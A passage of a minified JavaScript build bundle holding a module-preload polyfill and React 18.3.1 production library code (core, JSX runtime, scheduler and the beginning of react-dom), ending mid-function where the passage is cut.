function E_(t,e){for(var n=0;n<e.length;n++){const i=e[n];if(typeof i!="string"&&!Array.isArray(i)){for(const s in i)if(s!=="default"&&!(s in t)){const r=Object.getOwnPropertyDescriptor(i,s);r&&Object.defineProperty(t,s,r.get?r:{enumerable:!0,get:()=>i[s]})}}}return Object.freeze(Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}))}(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const s of document.querySelectorAll('link[rel="modulepreload"]'))i(s);new MutationObserver(s=>{for(const r of s)if(r.type==="childList")for(const a of r.addedNodes)a.tagName==="LINK"&&a.rel==="modulepreload"&&i(a)}).observe(document,{childList:!0,subtree:!0});function n(s){const r={};return s.integrity&&(r.integrity=s.integrity),s.referrerPolicy&&(r.referrerPolicy=s.referrerPolicy),s.crossOrigin==="use-credentials"?r.credentials="include":s.crossOrigin==="anonymous"?r.credentials="omit":r.credentials="same-origin",r}function i(s){if(s.ep)return;s.ep=!0;const r=n(s);fetch(s.href,r)}})();function T_(t){return t&&t.__esModule&&Object.prototype.hasOwnProperty.call(t,"default")?t.default:t}var Zm={exports:{}},Gl={},Jm={exports:{}},We={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Ka=Symbol.for("react.element"),A_=Symbol.for("react.portal"),C_=Symbol.for("react.fragment"),R_=Symbol.for("react.strict_mode"),P_=Symbol.for("react.profiler"),L_=Symbol.for("react.provider"),k_=Symbol.for("react.context"),N_=Symbol.for("react.forward_ref"),D_=Symbol.for("react.suspense"),I_=Symbol.for("react.memo"),U_=Symbol.for("react.lazy"),Ch=Symbol.iterator;function O_(t){return t===null||typeof t!="object"?null:(t=Ch&&t[Ch]||t["@@iterator"],typeof t=="function"?t:null)}var Qm={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},eg=Object.assign,tg={};function Br(t,e,n){this.props=t,this.context=e,this.refs=tg,this.updater=n||Qm}Br.prototype.isReactComponent={};Br.prototype.setState=function(t,e){if(typeof t!="object"&&typeof t!="function"&&t!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,t,e,"setState")};Br.prototype.forceUpdate=function(t){this.updater.enqueueForceUpdate(this,t,"forceUpdate")};function ng(){}ng.prototype=Br.prototype;function lp(t,e,n){this.props=t,this.context=e,this.refs=tg,this.updater=n||Qm}var cp=lp.prototype=new ng;cp.constructor=lp;eg(cp,Br.prototype);cp.isPureReactComponent=!0;var Rh=Array.isArray,ig=Object.prototype.hasOwnProperty,up={current:null},sg={key:!0,ref:!0,__self:!0,__source:!0};function rg(t,e,n){var i,s={},r=null,a=null;if(e!=null)for(i in e.ref!==void 0&&(a=e.ref),e.key!==void 0&&(r=""+e.key),e)ig.call(e,i)&&!sg.hasOwnProperty(i)&&(s[i]=e[i]);var o=arguments.length-2;if(o===1)s.children=n;else if(1<o){for(var l=Array(o),c=0;c<o;c++)l[c]=arguments[c+2];s.children=l}if(t&&t.defaultProps)for(i in o=t.defaultProps,o)s[i]===void 0&&(s[i]=o[i]);return{$$typeof:Ka,type:t,key:r,ref:a,props:s,_owner:up.current}}function F_(t,e){return{$$typeof:Ka,type:t.type,key:e,ref:t.ref,props:t.props,_owner:t._owner}}function dp(t){return typeof t=="object"&&t!==null&&t.$$typeof===Ka}function B_(t){var e={"=":"=0",":":"=2"};return"$"+t.replace(/[=:]/g,function(n){return e[n]})}var Ph=/\/+/g;function hc(t,e){return typeof t=="object"&&t!==null&&t.key!=null?B_(""+t.key):e.toString(36)}function $o(t,e,n,i,s){var r=typeof t;(r==="undefined"||r==="boolean")&&(t=null);var a=!1;if(t===null)a=!0;else switch(r){case"string":case"number":a=!0;break;case"object":switch(t.$$typeof){case Ka:case A_:a=!0}}if(a)return a=t,s=s(a),t=i===""?"."+hc(a,0):i,Rh(s)?(n="",t!=null&&(n=t.replace(Ph,"$&/")+"/"),$o(s,e,n,"",function(c){return c})):s!=null&&(dp(s)&&(s=F_(s,n+(!s.key||a&&a.key===s.key?"":(""+s.key).replace(Ph,"$&/")+"/")+t)),e.push(s)),1;if(a=0,i=i===""?".":i+":",Rh(t))for(var o=0;o<t.length;o++){r=t[o];var l=i+hc(r,o);a+=$o(r,e,n,l,s)}else if(l=O_(t),typeof l=="function")for(t=l.call(t),o=0;!(r=t.next()).done;)r=r.value,l=i+hc(r,o++),a+=$o(r,e,n,l,s);else if(r==="object")throw e=String(t),Error("Objects are not valid as a React child (found: "+(e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e)+"). If you meant to render a collection of children, use an array instead.");return a}function co(t,e,n){if(t==null)return t;var i=[],s=0;return $o(t,i,"","",function(r){return e.call(n,r,s++)}),i}function z_(t){if(t._status===-1){var e=t._result;e=e(),e.then(function(n){(t._status===0||t._status===-1)&&(t._status=1,t._result=n)},function(n){(t._status===0||t._status===-1)&&(t._status=2,t._result=n)}),t._status===-1&&(t._status=0,t._result=e)}if(t._status===1)return t._result.default;throw t._result}var sn={current:null},Ko={transition:null},V_={ReactCurrentDispatcher:sn,ReactCurrentBatchConfig:Ko,ReactCurrentOwner:up};function ag(){throw Error("act(...) is not supported in production builds of React.")}We.Children={map:co,forEach:function(t,e,n){co(t,function(){e.apply(this,arguments)},n)},count:function(t){var e=0;return co(t,function(){e++}),e},toArray:function(t){return co(t,function(e){return e})||[]},only:function(t){if(!dp(t))throw Error("React.Children.only expected to receive a single React element child.");return t}};We.Component=Br;We.Fragment=C_;We.Profiler=P_;We.PureComponent=lp;We.StrictMode=R_;We.Suspense=D_;We.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=V_;We.act=ag;We.cloneElement=function(t,e,n){if(t==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+t+".");var i=eg({},t.props),s=t.key,r=t.ref,a=t._owner;if(e!=null){if(e.ref!==void 0&&(r=e.ref,a=up.current),e.key!==void 0&&(s=""+e.key),t.type&&t.type.defaultProps)var o=t.type.defaultProps;for(l in e)ig.call(e,l)&&!sg.hasOwnProperty(l)&&(i[l]=e[l]===void 0&&o!==void 0?o[l]:e[l])}var l=arguments.length-2;if(l===1)i.children=n;else if(1<l){o=Array(l);for(var c=0;c<l;c++)o[c]=arguments[c+2];i.children=o}return{$$typeof:Ka,type:t.type,key:s,ref:r,props:i,_owner:a}};We.createContext=function(t){return t={$$typeof:k_,_currentValue:t,_currentValue2:t,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},t.Provider={$$typeof:L_,_context:t},t.Consumer=t};We.createElement=rg;We.createFactory=function(t){var e=rg.bind(null,t);return e.type=t,e};We.createRef=function(){return{current:null}};We.forwardRef=function(t){return{$$typeof:N_,render:t}};We.isValidElement=dp;We.lazy=function(t){return{$$typeof:U_,_payload:{_status:-1,_result:t},_init:z_}};We.memo=function(t,e){return{$$typeof:I_,type:t,compare:e===void 0?null:e}};We.startTransition=function(t){var e=Ko.transition;Ko.transition={};try{t()}finally{Ko.transition=e}};We.unstable_act=ag;We.useCallback=function(t,e){return sn.current.useCallback(t,e)};We.useContext=function(t){return sn.current.useContext(t)};We.useDebugValue=function(){};We.useDeferredValue=function(t){return sn.current.useDeferredValue(t)};We.useEffect=function(t,e){return sn.current.useEffect(t,e)};We.useId=function(){return sn.current.useId()};We.useImperativeHandle=function(t,e,n){return sn.current.useImperativeHandle(t,e,n)};We.useInsertionEffect=function(t,e){return sn.current.useInsertionEffect(t,e)};We.useLayoutEffect=function(t,e){return sn.current.useLayoutEffect(t,e)};We.useMemo=function(t,e){return sn.current.useMemo(t,e)};We.useReducer=function(t,e,n){return sn.current.useReducer(t,e,n)};We.useRef=function(t){return sn.current.useRef(t)};We.useState=function(t){return sn.current.useState(t)};We.useSyncExternalStore=function(t,e,n){return sn.current.useSyncExternalStore(t,e,n)};We.useTransition=function(){return sn.current.useTransition()};We.version="18.3.1";Jm.exports=We;var ee=Jm.exports;const og=T_(ee),H_=E_({__proto__:null,default:og},[ee]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var G_=ee,W_=Symbol.for("react.element"),j_=Symbol.for("react.fragment"),X_=Object.prototype.hasOwnProperty,q_=G_.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,Y_={key:!0,ref:!0,__self:!0,__source:!0};function lg(t,e,n){var i,s={},r=null,a=null;n!==void 0&&(r=""+n),e.key!==void 0&&(r=""+e.key),e.ref!==void 0&&(a=e.ref);for(i in e)X_.call(e,i)&&!Y_.hasOwnProperty(i)&&(s[i]=e[i]);if(t&&t.defaultProps)for(i in e=t.defaultProps,e)s[i]===void 0&&(s[i]=e[i]);return{$$typeof:W_,type:t,key:r,ref:a,props:s,_owner:q_.current}}Gl.Fragment=j_;Gl.jsx=lg;Gl.jsxs=lg;Zm.exports=Gl;var M=Zm.exports,cg={exports:{}},En={},ug={exports:{}},dg={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(t){function e(I,J){var K=I.length;I.push(J);e:for(;0<K;){var ne=K-1>>>1,we=I[ne];if(0<s(we,J))I[ne]=J,I[K]=we,K=ne;else break e}}function n(I){return I.length===0?null:I[0]}function i(I){if(I.length===0)return null;var J=I[0],K=I.pop();if(K!==J){I[0]=K;e:for(var ne=0,we=I.length,Pe=we>>>1;ne<Pe;){var Ge=2*(ne+1)-1,Ke=I[Ge],q=Ge+1,O=I[q];if(0>s(Ke,K))q<we&&0>s(O,Ke)?(I[ne]=O,I[q]=K,ne=q):(I[ne]=Ke,I[Ge]=K,ne=Ge);else if(q<we&&0>s(O,K))I[ne]=O,I[q]=K,ne=q;else break e}}return J}function s(I,J){var K=I.sortIndex-J.sortIndex;return K!==0?K:I.id-J.id}if(typeof performance=="object"&&typeof performance.now=="function"){var r=performance;t.unstable_now=function(){return r.now()}}else{var a=Date,o=a.now();t.unstable_now=function(){return a.now()-o}}var l=[],c=[],d=1,p=null,h=3,f=!1,_=!1,y=!1,m=typeof setTimeout=="function"?setTimeout:null,u=typeof clearTimeout=="function"?clearTimeout:null,g=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function x(I){for(var J=n(c);J!==null;){if(J.callback===null)i(c);else if(J.startTime<=I)i(c),J.sortIndex=J.expirationTime,e(l,J);else break;J=n(c)}}function S(I){if(y=!1,x(I),!_)if(n(l)!==null)_=!0,X(T);else{var J=n(c);J!==null&&H(S,J.startTime-I)}}function T(I,J){_=!1,y&&(y=!1,u(N),N=-1),f=!0;var K=h;try{for(x(J),p=n(l);p!==null&&(!(p.expirationTime>J)||I&&!P());){var ne=p.callback;if(typeof ne=="function"){p.callback=null,h=p.priorityLevel;var we=ne(p.expirationTime<=J);J=t.unstable_now(),typeof we=="function"?p.callback=we:p===n(l)&&i(l),x(J)}else i(l);p=n(l)}if(p!==null)var Pe=!0;else{var Ge=n(c);Ge!==null&&H(S,Ge.startTime-J),Pe=!1}return Pe}finally{p=null,h=K,f=!1}}var A=!1,R=null,N=-1,b=5,w=-1;function P(){return!(t.unstable_now()-w<b)}function z(){if(R!==null){var I=t.unstable_now();w=I;var J=!0;try{J=R(!0,I)}finally{J?V():(A=!1,R=null)}}else A=!1}var V;if(typeof g=="function")V=function(){g(z)};else if(typeof MessageChannel<"u"){var Z=new MessageChannel,$=Z.port2;Z.port1.onmessage=z,V=function(){$.postMessage(null)}}else V=function(){m(z,0)};function X(I){R=I,A||(A=!0,V())}function H(I,J){N=m(function(){I(t.unstable_now())},J)}t.unstable_IdlePriority=5,t.unstable_ImmediatePriority=1,t.unstable_LowPriority=4,t.unstable_NormalPriority=3,t.unstable_Profiling=null,t.unstable_UserBlockingPriority=2,t.unstable_cancelCallback=function(I){I.callback=null},t.unstable_continueExecution=function(){_||f||(_=!0,X(T))},t.unstable_forceFrameRate=function(I){0>I||125<I?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):b=0<I?Math.floor(1e3/I):5},t.unstable_getCurrentPriorityLevel=function(){return h},t.unstable_getFirstCallbackNode=function(){return n(l)},t.unstable_next=function(I){switch(h){case 1:case 2:case 3:var J=3;break;default:J=h}var K=h;h=J;try{return I()}finally{h=K}},t.unstable_pauseExecution=function(){},t.unstable_requestPaint=function(){},t.unstable_runWithPriority=function(I,J){switch(I){case 1:case 2:case 3:case 4:case 5:break;default:I=3}var K=h;h=I;try{return J()}finally{h=K}},t.unstable_scheduleCallback=function(I,J,K){var ne=t.unstable_now();switch(typeof K=="object"&&K!==null?(K=K.delay,K=typeof K=="number"&&0<K?ne+K:ne):K=ne,I){case 1:var we=-1;break;case 2:we=250;break;case 5:we=1073741823;break;case 4:we=1e4;break;default:we=5e3}return we=K+we,I={id:d++,callback:J,priorityLevel:I,startTime:K,expirationTime:we,sortIndex:-1},K>ne?(I.sortIndex=K,e(c,I),n(l)===null&&I===n(c)&&(y?(u(N),N=-1):y=!0,H(S,K-ne))):(I.sortIndex=we,e(l,I),_||f||(_=!0,X(T))),I},t.unstable_shouldYield=P,t.unstable_wrapCallback=function(I){var J=h;return function(){var K=h;h=J;try{return I.apply(this,arguments)}finally{h=K}}}})(dg);ug.exports=dg;var $_=ug.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var K_=ee,Mn=$_;function se(t){for(var e="https://reactjs.org/docs/error-decoder.html?invariant="+t,n=1;n<arguments.length;n++)e+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+t+"; visit "+e+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var pg=new Set,Ma={};function Vs(t,e){Ar(t,e),Ar(t+"Capture",e)}function Ar(t,e){for(Ma[t]=e,t=0;t<e.length;t++)pg.add(e[t])}var Ai=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),xu=Object.prototype.hasOwnProperty,Z_=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,Lh={},kh={};function J_(t){return xu.call(kh,t)?!0:xu.call(Lh,t)?!1:Z_.test(t)?kh[t]=!0:(Lh[t]=!0,!1)}function Q_(t,e,n,i){if(n!==null&&n.type===0)return!1;switch(typeof e){case"function":case"symbol":return!0;case"boolean":return i?!1:n!==null?!n.acceptsBooleans:(t=t.toLowerCase().slice(0,5),t!=="data-"&&t!=="aria-");default:return!1}}function ex(t,e,n,i){if(e===null||typeof e>"u"||Q_(t,e,n,i))return!0;if(i)return!1;if(n!==null)switch(n.type){case 3:return!e;case 4:return e===!1;case 5:return isNaN(e);case 6:return isNaN(e)||1>e}return!1}function rn(t,e,n,i,s,r,a){this.acceptsBooleans=e===2||e===3||e===4,this.attributeName=i,this.attributeNamespace=s,this.mustUseProperty=n,this.propertyName=t,this.type=e,this.sanitizeURL=r,this.removeEmptyString=a}var Wt={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(t){Wt[t]=new rn(t,0,!1,t,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(t){var e=t[0];Wt[e]=new rn(e,1,!1,t[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(t){Wt[t]=new rn(t,2,!1,t.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(t){Wt[t]=new rn(t,2,!1,t,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(t){Wt[t]=new rn(t,3,!1,t.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(t){Wt[t]=new rn(t,3,!0,t,null,!1,!1)});["capture","download"].forEach(function(t){Wt[t]=new rn(t,4,!1,t,null,!1,!1)});["cols","rows","size","span"].forEach(function(t){Wt[t]=new rn(t,6,!1,t,null,!1,!1)});["rowSpan","start"].forEach(function(t){Wt[t]=new rn(t,5,!1,t.toLowerCase(),null,!1,!1)});var pp=/[\-:]([a-z])/g;function hp(t){return t[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(t){var e=t.replace(pp,hp);Wt[e]=new rn(e,1,!1,t,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(t){var e=t.replace(pp,hp);Wt[e]=new rn(e,1,!1,t,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(t){var e=t.replace(pp,hp);Wt[e]=new rn(e,1,!1,t,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(t){Wt[t]=new rn(t,1,!1,t.toLowerCase(),null,!1,!1)});Wt.xlinkHref=new rn("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(t){Wt[t]=new rn(t,1,!1,t.toLowerCase(),null,!0,!0)});function fp(t,e,n,i){var s=Wt.hasOwnProperty(e)?Wt[e]:null;(s!==null?s.type!==0:i||!(2<e.length)||e[0]!=="o"&&e[0]!=="O"||e[1]!=="n"&&e[1]!=="N")&&(ex(e,n,s,i)&&(n=null),i||s===null?J_(e)&&(n===null?t.removeAttribute(e):t.setAttribute(e,""+n)):s.mustUseProperty?t[s.propertyName]=n===null?s.type===3?!1:"":n:(e=s.attributeName,i=s.attributeNamespace,n===null?t.removeAttribute(e):(s=s.type,n=s===3||s===4&&n===!0?"":""+n,i?t.setAttributeNS(i,e,n):t.setAttribute(e,n))))}var Ni=K_.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,uo=Symbol.for("react.element"),or=Symbol.for("react.portal"),lr=Symbol.for("react.fragment"),mp=Symbol.for("react.strict_mode"),yu=Symbol.for("react.profiler"),hg=Symbol.for("react.provider"),fg=Symbol.for("react.context"),gp=Symbol.for("react.forward_ref"),Su=Symbol.for("react.suspense"),bu=Symbol.for("react.suspense_list"),vp=Symbol.for("react.memo"),Gi=Symbol.for("react.lazy"),mg=Symbol.for("react.offscreen"),Nh=Symbol.iterator;function qr(t){return t===null||typeof t!="object"?null:(t=Nh&&t[Nh]||t["@@iterator"],typeof t=="function"?t:null)}var xt=Object.assign,fc;function ca(t){if(fc===void 0)try{throw Error()}catch(n){var e=n.stack.trim().match(/\n( *(at )?)/);fc=e&&e[1]||""}return`
`+fc+t}var mc=!1;function gc(t,e){if(!t||mc)return"";mc=!0;var n=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(e)if(e=function(){throw Error()},Object.defineProperty(e.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(e,[])}catch(c){var i=c}Reflect.construct(t,[],e)}else{try{e.call()}catch(c){i=c}t.call(e.prototype)}else{try{throw Error()}catch(c){i=c}t()}}catch(c){if(c&&i&&typeof c.stack=="string"){for(var s=c.stack.split(`
`),r=i.stack.split(`
`),a=s.length-1,o=r.length-1;1<=a&&0<=o&&s[a]!==r[o];)o--;for(;1<=a&&0<=o;a--,o--)if(s[a]!==r[o]){if(a!==1||o!==1)do if(a--,o--,0>o||s[a]!==r[o]){var l=`
`+s[a].replace(" at new "," at ");return t.displayName&&l.includes("<anonymous>")&&(l=l.replace("<anonymous>",t.displayName)),l}while(1<=a&&0<=o);break}}}finally{mc=!1,Error.prepareStackTrace=n}return(t=t?t.displayName||t.name:"")?ca(t):""}function tx(t){switch(t.tag){case 5:return ca(t.type);case 16:return ca("Lazy");case 13:return ca("Suspense");case 19:return ca("SuspenseList");case 0:case 2:case 15:return t=gc(t.type,!1),t;case 11:return t=gc(t.type.render,!1),t;case 1:return t=gc(t.type,!0),t;default:return""}}function wu(t){if(t==null)return null;if(typeof t=="function")return t.displayName||t.name||null;if(typeof t=="string")return t;switch(t){case lr:return"Fragment";case or:return"Portal";case yu:return"Profiler";case mp:return"StrictMode";case Su:return"Suspense";case bu:return"SuspenseList"}if(typeof t=="object")switch(t.$$typeof){case fg:return(t.displayName||"Context")+".Consumer";case hg:return(t._context.displayName||"Context")+".Provider";case gp:var e=t.render;return t=t.displayName,t||(t=e.displayName||e.name||"",t=t!==""?"ForwardRef("+t+")":"ForwardRef"),t;case vp:return e=t.displayName||null,e!==null?e:wu(t.type)||"Memo";case Gi:e=t._payload,t=t._init;try{return wu(t(e))}catch{}}return null}function nx(t){var e=t.type;switch(t.tag){case 24:return"Cache";case 9:return(e.displayName||"Context")+".Consumer";case 10:return(e._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return t=e.render,t=t.displayName||t.name||"",e.displayName||(t!==""?"ForwardRef("+t+")":"ForwardRef");case 7:return"Fragment";case 5:return e;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return wu(e);case 8:return e===mp?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e}return null}function os(t){switch(typeof t){case"boolean":case"number":case"string":case"undefined":return t;case"object":return t;default:return""}}function gg(t){var e=t.type;return(t=t.nodeName)&&t.toLowerCase()==="input"&&(e==="checkbox"||e==="radio")}function ix(t){var e=gg(t)?"checked":"value",n=Object.getOwnPropertyDescriptor(t.constructor.prototype,e),i=""+t[e];if(!t.hasOwnProperty(e)&&typeof n<"u"&&typeof n.get=="function"&&typeof n.set=="function"){var s=n.get,r=n.set;return Object.defineProperty(t,e,{configurable:!0,get:function(){return s.call(this)},set:function(a){i=""+a,r.call(this,a)}}),Object.defineProperty(t,e,{enumerable:n.enumerable}),{getValue:function(){return i},setValue:function(a){i=""+a},stopTracking:function(){t._valueTracker=null,delete t[e]}}}}function po(t){t._valueTracker||(t._valueTracker=ix(t))}function vg(t){if(!t)return!1;var e=t._valueTracker;if(!e)return!0;var n=e.getValue(),i="";return t&&(i=gg(t)?t.checked?"true":"false":t.value),t=i,t!==n?(e.setValue(t),!0):!1}function hl(t){if(t=t||(typeof document<"u"?document:void 0),typeof t>"u")return null;try{return t.activeElement||t.body}catch{return t.body}}function Mu(t,e){var n=e.checked;return xt({},e,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:n??t._wrapperState.initialChecked})}function Dh(t,e){var n=e.defaultValue==null?"":e.defaultValue,i=e.checked!=null?e.checked:e.defaultChecked;n=os(e.value!=null?e.value:n),t._wrapperState={initialChecked:i,initialValue:n,controlled:e.type==="checkbox"||e.type==="radio"?e.checked!=null:e.value!=null}}function _g(t,e){e=e.checked,e!=null&&fp(t,"checked",e,!1)}function Eu(t,e){_g(t,e);var n=os(e.value),i=e.type;if(n!=null)i==="number"?(n===0&&t.value===""||t.value!=n)&&(t.value=""+n):t.value!==""+n&&(t.value=""+n);else if(i==="submit"||i==="reset"){t.removeAttribute("value");return}e.hasOwnProperty("value")?Tu(t,e.type,n):e.hasOwnProperty("defaultValue")&&Tu(t,e.type,os(e.defaultValue)),e.checked==null&&e.defaultChecked!=null&&(t.defaultChecked=!!e.defaultChecked)}function Ih(t,e,n){if(e.hasOwnProperty("value")||e.hasOwnProperty("defaultValue")){var i=e.type;if(!(i!=="submit"&&i!=="reset"||e.value!==void 0&&e.value!==null))return;e=""+t._wrapperState.initialValue,n||e===t.value||(t.value=e),t.defaultValue=e}n=t.name,n!==""&&(t.name=""),t.defaultChecked=!!t._wrapperState.initialChecked,n!==""&&(t.name=n)}function Tu(t,e,n){(e!=="number"||hl(t.ownerDocument)!==t)&&(n==null?t.defaultValue=""+t._wrapperState.initialValue:t.defaultValue!==""+n&&(t.defaultValue=""+n))}var ua=Array.isArray;function xr(t,e,n,i){if(t=t.options,e){e={};for(var s=0;s<n.length;s++)e["$"+n[s]]=!0;for(n=0;n<t.length;n++)s=e.hasOwnProperty("$"+t[n].value),t[n].selected!==s&&(t[n].selected=s),s&&i&&(t[n].defaultSelected=!0)}else{for(n=""+os(n),e=null,s=0;s<t.length;s++){if(t[s].value===n){t[s].selected=!0,i&&(t[s].defaultSelected=!0);return}e!==null||t[s].disabled||(e=t[s])}e!==null&&(e.selected=!0)}}function Au(t,e){if(e.dangerouslySetInnerHTML!=null)throw Error(se(91));return xt({},e,{value:void 0,defaultValue:void 0,children:""+t._wrapperState.initialValue})}function Uh(t,e){var n=e.value;if(n==null){if(n=e.children,e=e.defaultValue,n!=null){if(e!=null)throw Error(se(92));if(ua(n)){if(1<n.length)throw Error(se(93));n=n[0]}e=n}e==null&&(e=""),n=e}t._wrapperState={initialValue:os(n)}}function xg(t,e){var n=os(e.value),i=os(e.defaultValue);n!=null&&(n=""+n,n!==t.value&&(t.value=n),e.defaultValue==null&&t.defaultValue!==n&&(t.defaultValue=n)),i!=null&&(t.defaultValue=""+i)}function Oh(t){var e=t.textContent;e===t._wrapperState.initialValue&&e!==""&&e!==null&&(t.value=e)}function yg(t){switch(t){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function Cu(t,e){return t==null||t==="http://www.w3.org/1999/xhtml"?yg(e):t==="http://www.w3.org/2000/svg"&&e==="foreignObject"?"http://www.w3.org/1999/xhtml":t}var ho,Sg=function(t){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(e,n,i,s){MSApp.execUnsafeLocalFunction(function(){return t(e,n,i,s)})}:t}(function(t,e){if(t.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in t)t.innerHTML=e;else{for(ho=ho||document.createElement("div"),ho.innerHTML="<svg>"+e.valueOf().toString()+"</svg>",e=ho.firstChild;t.firstChild;)t.removeChild(t.firstChild);for(;e.firstChild;)t.appendChild(e.firstChild)}});function Ea(t,e){if(e){var n=t.firstChild;if(n&&n===t.lastChild&&n.nodeType===3){n.nodeValue=e;return}}t.textContent=e}var ma={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},sx=["Webkit","ms","Moz","O"];Object.keys(ma).forEach(function(t){sx.forEach(function(e){e=e+t.charAt(0).toUpperCase()+t.substring(1),ma[e]=ma[t]})});function bg(t,e,n){return e==null||typeof e=="boolean"||e===""?"":n||typeof e!="number"||e===0||ma.hasOwnProperty(t)&&ma[t]?(""+e).trim():e+"px"}function wg(t,e){t=t.style;for(var n in e)if(e.hasOwnProperty(n)){var i=n.indexOf("--")===0,s=bg(n,e[n],i);n==="float"&&(n="cssFloat"),i?t.setProperty(n,s):t[n]=s}}var rx=xt({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function Ru(t,e){if(e){if(rx[t]&&(e.children!=null||e.dangerouslySetInnerHTML!=null))throw 